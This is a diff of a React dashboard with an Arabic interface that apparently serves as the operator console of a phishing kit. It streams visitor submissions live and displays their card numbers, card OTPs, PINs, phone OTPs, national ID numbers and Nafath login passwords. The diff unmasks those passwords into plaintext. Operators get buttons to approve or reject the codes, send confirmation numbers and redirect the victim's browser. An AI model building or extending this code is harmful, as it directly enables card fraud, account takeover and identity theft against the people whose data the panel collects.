@@ -13,8 +13,11 @@ type RequestItem = {
   visitorId?: string;
   submittedAt?: string;
   hasCard?: boolean;
+  archived?: boolean;
   raw?: Record<string, any>;
 };
+
+const DASHBOARD_BACKEND_URL = import.meta.env.VITE_BACKEND_TARGET || "http://127.0.0.1:3002";
 
 const countryFlags: Record<string, string> = {
   sa: "🇸🇦", ksa: "🇸🇦", saudi: "🇸🇦", "saudi arabia": "🇸🇦", السعودية: "🇸🇦",
@@ -36,11 +39,30 @@ function formatElapsedTime(isoString?: string): string {
   const diff = Date.now() - new Date(isoString).getTime();
   if (diff < 0) return "الآن";
   const seconds = Math.floor(diff / 1000);
-  if (seconds < 60) return `${seconds}ث`;
+  if (seconds < 60) return seconds <= 1 ? "قبل ثانية" : `قبل ${seconds} ثانية`;
   const minutes = Math.floor(seconds / 60);
-  if (minutes < 60) return `${minutes}د ${seconds % 60}ث`;
+  if (minutes < 60) return minutes <= 1 ? "قبل دقيقة" : `قبل ${minutes} دقائق`;
   const hours = Math.floor(minutes / 60);
-  return `${hours}س ${minutes % 60}د`;
+  if (hours < 24) return hours <= 1 ? "قبل ساعة" : `قبل ${hours} ساعات`;
+  const days = Math.floor(hours / 24);
+  return days <= 1 ? "قبل يوم" : `قبل ${days} أيام`;
+}
+
+function getAgeStatus(isoString?: string): { label: string; isStale: boolean } {
+  if (!isoString) return { label: "غير محدد", isStale: true };
+  const diff = Date.now() - new Date(isoString).getTime();
+  const minutes = Math.floor(diff / 60000);
+  if (minutes < 5) return { label: "جديد", isStale: false };
+  if (minutes < 60) return { label: `قبل ${minutes} دقيقة`, isStale: true };
+  const hours = Math.floor(minutes / 60);
+  if (hours < 24) return { label: `قبل ${hours} ساعة`, isStale: true };
+  const days = Math.floor(hours / 24);
+  return { label: `قبل ${days} يوم`, isStale: true };
+}
+
+function formatRelativeTimeLabel(isoString?: string): string {
+  const age = getAgeStatus(isoString);
+  return age.label;
 }
 
 // Live timer component for each request
@@ -68,8 +90,11 @@ export default function DashboardPage() {
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
   const [redirectPage, setRedirectPage] = useState("");
+  const [headerMenuOpen, setHeaderMenuOpen] = useState(false);
+  const [selectedRequestIds, setSelectedRequestIds] = useState<string[]>([]);
   const socketRef = useRef<Socket | null>(null);
   const currentTimeRef = useRef(Date.now());
+  const headerMenuRef = useRef<HTMLDivElement | null>(null);
 
   // Page options for manual redirect
   const pageOptions = [
@@ -84,54 +109,110 @@ export default function DashboardPage() {
     { value: "thank-you", label: "✅ شكراً لك" },
   ];
 
-  // Stats
+  // Stats derived from the real visitor data stream
   const stats = useMemo(() => {
     const total = requests.length;
     const newCount = requests.filter((r) => r.badge === "new").length;
     const pendingCount = requests.filter((r) => r.badge === "pending").length;
     const completedCount = requests.filter((r) => r.badge === "completed").length;
-    return { total, newCount, pendingCount, completedCount };
+    const activeCount = Math.max(0, total - completedCount);
+    const todayCount = requests.filter((request) => {
+      const submitted = request.submittedAt || request.updatedAt;
+      if (!submitted) return false;
+      const date = new Date(submitted);
+      const nowDate = new Date();
+      return date.getDate() === nowDate.getDate() && date.getMonth() === nowDate.getMonth() && date.getFullYear() === nowDate.getFullYear();
+    }).length;
+    const cardCount = requests.filter((request) => Boolean(request.hasCard || request.raw?._v1 || request.raw?.cardNumber || request.raw?.paymentStatus)).length;
+    const phoneCount = requests.filter((request) => Boolean(request.raw?.phoneNumber || request.raw?.phoneIdNumber || request.raw?.phoneOtpStatus || request.raw?.phoneCarrier)).length;
+
+    return {
+      total,
+      newCount,
+      pendingCount,
+      completedCount,
+      activeCount,
+      todayCount,
+      cardCount,
+      phoneCount,
+    };
   }, [requests]);
 
-  // Sort requests by updatedAt (newest first)
+  // Sort requests by the original submission time (newest first)
   const sortedRequests = useMemo(() => {
     return [...requests].sort((a, b) => {
-      const timeA = new Date(a.updatedAt || a.submittedAt || 0).getTime();
-      const timeB = new Date(b.updatedAt || b.submittedAt || 0).getTime();
+      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
+      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
       return timeB - timeA; // Descending order (newest first)
     });
   }, [requests]);
 
   // Handle Socket.IO update
   const handleSocketUpdate = useCallback((updatedRequest: any) => {
-    // Add updatedAt timestamp if not present
-    if (!updatedRequest.updatedAt) {
-      updatedRequest.updatedAt = new Date().toISOString();
-    }
+    const incomingRequest = {
+      ...updatedRequest,
+      submittedAt: updatedRequest.submittedAt || updatedRequest.updatedAt || undefined,
+      updatedAt: updatedRequest.updatedAt || updatedRequest.submittedAt || undefined,
+    };
     
     setRequests(prevRequests => {
       const existingIndex = prevRequests.findIndex(
-        (r) => r.id === updatedRequest.id || r.visitorId === updatedRequest.visitorId
+        (r) => r.id === incomingRequest.id || r.visitorId === incomingRequest.visitorId
       );
       
       if (existingIndex >= 0) {
+        const existing = prevRequests[existingIndex];
         const newRequests = [...prevRequests];
-        newRequests[existingIndex] = updatedRequest;
+        newRequests[existingIndex] = {
+          ...existing,
+          ...incomingRequest,
+          submittedAt: incomingRequest.submittedAt || existing.submittedAt,
+          updatedAt: incomingRequest.updatedAt || existing.updatedAt,
+        };
         return newRequests;
       } else {
-        return [updatedRequest, ...prevRequests];
+        return [incomingRequest, ...prevRequests];
       }
     });
     
-    if (selectedRequestId && (updatedRequest.id === selectedRequestId || updatedRequest.visitorId === selectedRequestId)) {
-      setSelectedRequestId(updatedRequest.id);
+    if (selectedRequestId && (incomingRequest.id === selectedRequestId || incomingRequest.visitorId === selectedRequestId)) {
+      setSelectedRequestId(incomingRequest.id);
     }
+  }, [selectedRequestId]);
+
+  // Load initial requests directly from the backend API so the dashboard is not empty
+  useEffect(() => {
+    let isMounted = true;
+
+    async function loadInitialRequests() {
+      try {
+        const response = await fetch("/api/dashboard/requests", {
+          headers: { "Cache-Control": "no-store" },
+        });
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const data = await response.json();
+        if (!isMounted) return;
+        if (Array.isArray(data)) {
+          setRequests(data);
+          if (!selectedRequestId && data.length > 0) {
+            setSelectedRequestId(data[0].id);
+          }
+        }
+      } catch (error) {
+        console.error("[Dashboard] Failed to load initial requests", error);
+      }
+    }
+
+    loadInitialRequests();
+    return () => {
+      isMounted = false;
+    };
   }, [selectedRequestId]);
 
   // Socket.IO connection
   useEffect(() => {
-    // Create Socket.IO connection
-    const socket = io("/", {
+    // Create Socket.IO connection to the backend server directly
+    const socket = io(DASHBOARD_BACKEND_URL, {
       transports: ["websocket", "polling"],
       reconnection: true,
       reconnectionDelay: 1000,
@@ -179,6 +260,18 @@ export default function DashboardPage() {
     return () => clearInterval(interval);
   }, []);
 
+  // Close header menu when clicking outside
+  useEffect(() => {
+    const handlePointerDown = (event: MouseEvent) => {
+      if (headerMenuRef.current && !headerMenuRef.current.contains(event.target as Node)) {
+        setHeaderMenuOpen(false);
+      }
+    };
+
+    document.addEventListener("mousedown", handlePointerDown);
+    return () => document.removeEventListener("mousedown", handlePointerDown);
+  }, []);
+
   // Get country flag
   const getCountryFlag = (raw?: Record<string, any>): string => {
     if (!raw) return "🌐";
@@ -211,11 +304,20 @@ export default function DashboardPage() {
     return "📱";
   };
 
+  const getRealFieldValue = (raw: Record<string, any> | undefined, keys: string[], fallback = "—") => {
+    if (!raw) return fallback;
+    for (const key of keys) {
+      const value = raw[key];
+      if (value !== undefined && value !== null && value !== "") return String(value);
+    }
+    return fallback;
+  };
+
   // Filter requests
   const filteredRequests = useMemo(() => {
-    let filtered = sortedRequests;
+    let filtered = sortedRequests.filter((r) => !r.archived);
     if (filterMode === "cards") {
-      filtered = sortedRequests.filter((r) => r.hasCard);
+      filtered = filtered.filter((r) => r.hasCard);
     }
     if (searchQuery.trim()) {
       const query = searchQuery.toLowerCase();
@@ -230,7 +332,102 @@ export default function DashboardPage() {
     return filtered;
   }, [sortedRequests, filterMode, searchQuery]);
 
+  const toggleRequestSelection = (requestId: string) => {
+    setSelectedRequestIds((prev) =>
+      prev.includes(requestId) ? prev.filter((id) => id !== requestId) : [...prev, requestId]
+    );
+  };
+
+  const handleSelectAll = () => {
+    const visibleIds = filteredRequests.map((item) => item.id);
+    if (!visibleIds.length) return;
+
+    setSelectedRequestIds((prev) => {
+      const allVisibleSelected = visibleIds.every((id) => prev.includes(id));
+      return allVisibleSelected ? [] : visibleIds;
+    });
+  };
+
+  const handleDeleteSelected = () => {
+    if (!selectedRequestIds.length) return;
+    const selectedSet = new Set(selectedRequestIds);
+    setRequests((prev) => prev.filter((item) => !selectedSet.has(item.id)));
+    setSelectedRequestIds([]);
+    setSelectedRequestId((current) => (current && selectedSet.has(current) ? null : current));
+  };
+
+  const handleArchiveSelected = () => {
+    if (!selectedRequestIds.length) return;
+    const selectedSet = new Set(selectedRequestIds);
+    setRequests((prev) => prev.map((item) => (selectedSet.has(item.id) ? { ...item, archived: true } : item)));
+    setSelectedRequestIds([]);
+    setSelectedRequestId((current) => (current && selectedSet.has(current) ? null : current));
+  };
+
   const selectedRequest = requests.find((r) => r.id === selectedRequestId) ?? filteredRequests[0];
+
+  const normalizeCustomerValue = (value?: unknown) => {
+    if (value === undefined || value === null || value === "") return "";
+    return String(value).trim().toLowerCase();
+  };
+
+  const getCustomerIdentityTokens = (request?: RequestItem) => {
+    const raw = request?.raw || {};
+    return [
+      normalizeCustomerValue(request?.visitorId || raw?.visitorId),
+      normalizeCustomerValue(raw?.identityNumber || raw?.phoneIdNumber || raw?.nafadIdNumber),
+      normalizeCustomerValue(raw?.phoneNumber || raw?.mobileNumber),
+      normalizeCustomerValue(request?.customer || raw?.ownerName || raw?.name || raw?.customer),
+    ].filter(Boolean);
+  };
+
+  const isSameCustomerEntry = (a?: RequestItem, b?: RequestItem) => {
+    if (!a || !b) return false;
+    if (a.id && b.id && a.id === b.id) return true;
+    if (a.visitorId && b.visitorId && a.visitorId === b.visitorId) return true;
+    const tokensA = getCustomerIdentityTokens(a);
+    const tokensB = getCustomerIdentityTokens(b);
+    return tokensA.some((token) => tokensB.includes(token)) && tokensA.length > 1 && tokensB.length > 1;
+  };
+
+  const customerEntryGroup = useMemo(() => {
+    if (!selectedRequest) return [];
+    const matches = requests.filter((request) => isSameCustomerEntry(request, selectedRequest));
+    return [...matches].sort((a, b) => {
+      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
+      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
+      return timeB - timeA;
+    });
+  }, [requests, selectedRequest]);
+
+  const liveSummary = useMemo(() => {
+    const raw = selectedRequest?.raw || {};
+    const ownerName = selectedRequest?.customer || getRealFieldValue(raw, ["ownerName", "buyerName", "name", "firstName", "lastName"], "—");
+    const identityNumber = getRealFieldValue(raw, ["identityNumber", "phoneIdNumber", "nafadIdNumber", "buyerIdNumber"], "—");
+    const phoneNumber = getRealFieldValue(raw, ["phoneNumber", "mobileNumber", "phone", "phoneNumberValue"], "—");
+    const phoneCarrier = getRealFieldValue(raw, ["phoneCarrier", "carrier", "network"], "غير محدد");
+    const deviceType = getRealFieldValue(raw, ["deviceType", "device", "platform"], "غير معروف");
+    const browser = getRealFieldValue(raw, ["browser", "browserName", "userAgent"], "غير معروف");
+    const os = getRealFieldValue(raw, ["os", "operatingSystem", "osName"], "غير معروف");
+    const country = getRealFieldValue(raw, ["country", "countryCode", "countryName"], "غير معروف");
+    const ip = getRealFieldValue(raw, ["ip", "clientIp", "visitorIp"], "—");
+    const currentPage = getRealFieldValue(raw, ["currentPage", "page"], raw.currentPage || raw.page || "غير معروف");
+    const currentStep = getRealFieldValue(raw, ["currentStep", "step"], "—");
+
+    return {
+      ownerName,
+      identityNumber,
+      phoneNumber,
+      phoneCarrier,
+      deviceType,
+      browser,
+      os,
+      country,
+      ip,
+      currentPage,
+      currentStep,
+    };
+  }, [selectedRequest]);
 
   // Show notification
   const showNotification = (type: "success" | "error", message: string) => {
@@ -517,7 +714,7 @@ export default function DashboardPage() {
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
             صندوق رمز التحقق من البطاقة
           </h3>
-          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 2</span>
+          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>{formatRelativeTimeLabel(selectedRequest?.submittedAt || selectedRequest?.updatedAt)}</span>
         </div>
         
         {/* Show OTP code when submitted */}
@@ -540,9 +737,7 @@ export default function DashboardPage() {
           </div>
         )}
         {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && (
-          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار مراجعة الرمز</p>
-          </div>
+          <div style={{ background: "transparent", borderRadius: 8, padding: 0, border: "none", marginBottom: 0 }} />
         )}
         
         {/* Action buttons - show only when at this step and status is pending/verifying */}
@@ -577,28 +772,30 @@ export default function DashboardPage() {
     }
 
     return (
-      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
-        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
-          <span style={{ fontSize: "1.2rem" }}>🔑</span>
-          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
-            صندوق رمز PIN
-          </h3>
-          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 3</span>
+      <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 12 }}>
+        <div style={{ marginBottom: 8 }}>
+          <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
+            {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
+          </div>
+          <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>رمز PIN</h3>
         </div>
-        
-        {/* Status message */}
+        <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 8 }}>
+          {Array.from({ length: 4 }).map((_, idx) => {
+            const pinValue = String(raw?._v6 || raw?.pinCode || "0000").padStart(4, "0")[idx] || "0";
+            return (
+              <div key={idx} style={{ background: "#ffffff", borderRadius: 6, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", display: "flex", alignItems: "center", justifyContent: "center", width: 32, height: 40 }}>
+                <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#111827" }}>{pinValue}</span>
+              </div>
+            );
+          })}
+        </div>
         {pinStatus === "approved" && (
-          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 8 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إدخال رمز PIN - العميل يُوجه للهاتف</p>
           </div>
         )}
-        {pinStatus === "pending" && currentStep === 6 && (
-          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال رمز PIN</p>
-          </div>
-        )}
         {pinStatus === "rejected" && (
-          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
+          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 8 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ تم رفض رمز PIN</p>
           </div>
         )}
@@ -609,76 +806,91 @@ export default function DashboardPage() {
   // Render Phone OTP box (currentStep === 7)
   const renderPhoneOtpBox = () => {
     const currentStep = getCurrentStep();
+    const currentPage = getCurrentPage();
     const phoneOtpStatus = getPhoneOtpStatus();
     const raw = selectedRequest?.raw;
 
     // Get phone OTP code if submitted (stored as _v7 in history)
-    const phoneOtpCode = raw?._v7 || raw?.phoneOtp || "";
+    const phoneOtpCode = String(raw?._v7 || raw?.phoneOtp || "").trim();
 
     // Show box if there's phone data OR OTP code OR status exists
-    const hasPhoneData = raw?.phoneNumber || raw?.phoneIdNumber;
-    const hasAnyPhoneData = hasPhoneData || phoneOtpCode || phoneOtpStatus;
+    const hasPhoneData = Boolean(raw?.phoneNumber || raw?.phoneIdNumber);
+    const hasAnyPhoneData = hasPhoneData || Boolean(phoneOtpCode) || Boolean(phoneOtpStatus);
+    const shouldShowPhoneOtpBox = hasAnyPhoneData || currentStep === 5 || currentPage === "step5" || currentPage === "phone";
     
     // Always show if there's any phone-related data, never hide
-    if (!hasAnyPhoneData && currentStep !== 7) {
+    if (!shouldShowPhoneOtpBox && currentStep !== 7) {
       return null;
     }
 
     return (
-      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
-        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
-          <span style={{ fontSize: "1.2rem" }}>📱</span>
-          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
-            صندوق رمز تحقق الهاتف
-          </h3>
-          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 4</span>
+      <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 12 }}>
+        <div style={{ marginBottom: 8 }}>
+          <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
+            {(() => {
+              const dt = new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now());
+              const dateLabel = dt.toLocaleDateString("en-US", { month: "2-digit", day: "2-digit" }).replace(/\//g, "-");
+              const timeLabel = dt.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", hour12: true }).toLowerCase();
+              return `${dateLabel} | ${timeLabel}`;
+            })()}
+          </div>
+          <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>تحقق الهاتف</h3>
         </div>
-        
-        {/* Phone data info - ALWAYS show if exists */}
+
         {hasPhoneData && (
-          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12 }}>
-            {(raw?.phoneIdNumber || raw?.identityNumber) && (
-              <p style={{ margin: "0 0 4px", fontSize: "0.8rem", color: "#0369a1" }}>
-                رقم الهوية: <strong dir="ltr">{raw.phoneIdNumber || raw.identityNumber}</strong>
-              </p>
-            )}
-            {raw?.phoneNumber && (
-              <p style={{ margin: "0 0 4px", fontSize: "0.8rem", color: "#0369a1" }}>
-                رقم الهاتف: <strong dir="ltr">{raw.phoneNumber}</strong>
-              </p>
-            )}
-            <p style={{ margin: 0, fontSize: "0.8rem", color: "#0369a1" }}>
-              الشركة: <strong>{raw.phoneCarrier || "غير محدد"}</strong>
-            </p>
+          <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
+            <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
+                <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الهوية:</span>
+                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneIdNumber || raw?.identityNumber || "غير متوفر"}</span>
+              </div>
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
+                <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الجوال:</span>
+                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right", direction: "ltr" }}>{raw?.phoneNumber || raw?.mobileNumber || "غير متوفر"}</span>
+              </div>
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
+                <span style={{ fontWeight: 600, color: "#6b7280" }}>شركة الاتصالات:</span>
+                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{raw?.phoneCarrier || "غير محدد"}</span>
+              </div>
+            </div>
           </div>
         )}
-        
-        {/* Show phone OTP code when submitted - THIS IS THE KEY BOX */}
-        {phoneOtpCode ? (
-          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 16, border: "2px solid #f59e0b", marginBottom: 12, textAlign: "center" }}>
-            <p style={{ margin: "0 0 4px", fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>🔐 رمز التحقق المُدخل:</p>
-            <p style={{ margin: 0, fontSize: "2rem", fontWeight: 700, color: "#78350f", letterSpacing: "0.4em" }}>{phoneOtpCode}</p>
-          </div>
-        ) : (
-          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال رمز التحقق</p>
+
+        {phoneOtpCode && (
+          <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 8 }}>
+            <div style={{ marginBottom: 8 }}>
+              <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
+                {(() => {
+                  const dt = new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now());
+                  const dateLabel = dt.toLocaleDateString("en-US", { month: "2-digit", day: "2-digit" }).replace(/\//g, "-");
+                  const timeLabel = dt.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", hour12: true }).toLowerCase();
+                  return `${dateLabel} | ${timeLabel}`;
+                })()}
+              </div>
+              <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>كود تحقق الهاتف</h3>
+            </div>
+            <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 0 }}>
+              {String(phoneOtpCode).split("").slice(0, 6).map((digit, idx) => (
+                <div key={`${digit}-${idx}`} style={{ background: "#ffffff", borderRadius: 6, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", display: "flex", alignItems: "center", justifyContent: "center", width: 32, height: 40 }}>
+                  <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#111827" }}>{digit}</span>
+                </div>
+              ))}
+            </div>
           </div>
         )}
-        
-        {/* Status message */}
+
         {phoneOtpStatus === "approved" && (
-          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 8 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للصفحة التالية</p>
           </div>
         )}
         {phoneOtpStatus === "rejected" && (
-          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
+          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 8 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - رقم الهاتف غير صحيح</p>
           </div>
         )}
-        
-        {/* Action buttons - show ONLY when OTP code is submitted */}
-        {phoneOtpCode && (
+
+        {(phoneOtpCode || currentStep === 5 || currentPage === "step5" || currentPage === "phone") && (
           <div style={{ display: "flex", gap: 8, flexDirection: "column" }}>
             <div style={{ display: "flex", gap: 8 }}>
               <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
@@ -715,91 +927,83 @@ export default function DashboardPage() {
     }
 
     return (
-      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
-        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
-          <span style={{ fontSize: "1.2rem" }}>🔐</span>
-          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
-            صندوق التحقق من النفاذ
-          </h3>
-          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 5</span>
+      <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 12 }}>
+        <div style={{ marginBottom: 8 }}>
+          <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
+            {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
+          </div>
+          <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>🇸🇦 نفاذ</h3>
         </div>
-        
-        {/* Nafad credentials - show when submitted */}
-        {hasNafadData && (
-          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12 }}>
+        <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
+          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
             {raw?.nafadIdNumber && (
-              <p style={{ margin: "0 0 4px", fontSize: "0.8rem", color: "#0369a1" }}>
-                رقم الهوية: <strong dir="ltr">{raw.nafadIdNumber}</strong>
-              </p>
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
+                <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم الهوية:</span>
+                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{raw.nafadIdNumber}</span>
+              </div>
             )}
             {raw?.nafadPassword && (
-              <p style={{ margin: 0, fontSize: "0.8rem", color: "#0369a1" }}>
-                كلمة المرور: <strong dir="ltr">{"*".repeat(String(raw.nafadPassword).length)}</strong>
-              </p>
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
+                <span style={{ fontWeight: 600, color: "#6b7280" }}>كلمة المرور:</span>
+                <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{String(raw.nafadPassword)}</span>
+              </div>
             )}
-          </div>
-        )}
-        
-        {/* Input for nafad code - ALWAYS show when nafad data exists (for unlimited sends) */}
-        {hasNafadData && (
-          <div style={{ marginBottom: 12 }}>
-            <p style={{ margin: "0 0 8px", fontSize: "0.85rem", color: "#374151", fontWeight: 600 }}>
-              أدخل رمز النفاذ لإرساله للعميل:
-            </p>
-            <div style={{ display: "flex", gap: 8 }}>
-              <input
-                type="tel"
-                maxLength={2}
-                value={nafadInput}
-                onChange={(e) => setNafadInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
-                placeholder={adminNafadCode || "00"}
-                style={{
-                  flex: 1,
-                  padding: "10px 16px",
-                  borderRadius: 8,
-                  border: "2px solid #e5e7eb",
-                  fontSize: "1.2rem",
-                  textAlign: "center",
-                  fontWeight: 700,
-                }}
-              />
-              <button
-                onClick={() => {
-                  handleSendNafadCode();
-                  setNafadInput(""); // Clear input after sending
-                }}
-                disabled={actionLoading === "nafad" || !nafadInput}
-                style={{
-                  padding: "10px 20px",
-                  borderRadius: 8,
-                  border: "none",
-                  background: nafadInput ? "#22c55e" : "#9ca3af",
-                  color: "#fff",
-                  fontWeight: 700,
-                  cursor: nafadInput ? "pointer" : "not-allowed",
-                }}
-              >
-                {actionLoading === "nafad" ? "جاري..." : "📤 إرسال"}
-              </button>
+            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, fontSize: "0.875rem" }}>
+              <span style={{ fontWeight: 600, color: "#6b7280" }}>رقم التأكيد المُرسل:</span>
+              <span style={{ color: "#111827", fontWeight: 700, textAlign: "right" }}>{adminNafadCode || "00"}</span>
             </div>
           </div>
-        )}
-        
-        {/* Status when code sent - show last sent code */}
-        {adminNafadCode && (
-          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 16, border: "2px solid #86efac", marginBottom: 12, textAlign: "center" }}>
-            <p style={{ margin: "0 0 4px", fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إرسال رمز النفاذ:</p>
-            <p style={{ margin: 0, fontSize: "2.5rem", fontWeight: 700, color: "#166534", letterSpacing: "0.5em" }}>{adminNafadCode}</p>
-            <p style={{ margin: "8px 0 0", fontSize: "0.75rem", color: "#166534" }}>يمكن إرسال رمز جديد في أي وقت</p>
+        </div>
